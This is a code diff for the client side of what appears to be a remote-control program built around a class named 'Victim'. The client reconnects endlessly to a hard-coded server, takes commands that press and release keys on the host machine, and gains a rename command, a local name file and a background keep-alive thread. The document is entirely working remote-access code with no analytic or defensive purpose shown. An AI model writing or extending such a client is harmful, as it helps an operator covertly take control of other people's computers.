@@ -2,20 +2,35 @@
 
 Victim::Victim()
 {    
+    //if needed create the context file
+    std::ofstream createFile("./vcontext.txt", std::ios::app);
+    createFile.close();
+    //read the context file
+    std::ifstream readFile("./vcontext.txt");
+    getline(readFile, name);
+    while (name.size() > 0 && name[0] == ' ')
+        name.erase(name.begin());
+    while (name.size() > 0 && name[name.size() - 1] == ' ')
+        name.erase(name.begin() + name.size() - 1);
+    readFile.close();
+
     for (int i = 0; i < 256; i++)
         keysStates[i] = false;
     connectServer();
+
+    std::thread keepAwake(&Victim::keepAwake, this);
+    keepAwake.detach();
 }
 
 int Victim::controlVictim()
 {
-    while (isRunning)
-    {
+    while (isRunning) {
         sf::Packet p;
         server.receive(p);
 
         if (p.getDataSize() == 0) {
             std::cout << "DISCONNECTED FROM SERVER\n";
+            isConnected = false;
             connectServer();
         }
 
@@ -68,8 +83,16 @@ int Victim::controlVictim()
                     Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
             }
         }
+        //rename 
+        else if (cmd == 'w') {
+            p >> name;
+            std::ofstream file("./vcontext.txt", std::ios::trunc);
+            file.write(name.c_str(), name.size());
+            file.close();
+        }
         //apparently victim isnt initialized
         else if (cmd == '?') {
+            isConnected = false;
             connectServer();
         }
     }
@@ -77,16 +100,28 @@ int Victim::controlVictim()
     return 0;
 }
 
+void Victim::keepAwake()
+{
+    while (true) {
+        if (isConnected && Mlib::getTime() - lastAwakeSignal > 2'000) {
+            sf::Packet p;
+            p << sf::Uint8('r');
+            server.send(p);
+            lastAwakeSignal = Mlib::getTime();
+        }
+        Mlib::sleep(50);
+    }
+}
+
 void Victim::connectServer()
 {
-    isConnected = false;
     while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
     std::cout << "connected with server\n";
 
 init:
     sf::Uint8 role = '-';
     sf::Packet p;
-    p << sf::Uint8('v');
+    p << sf::Uint8('v') << name;
     server.send(p);
     p.clear();
     server.receive(p);
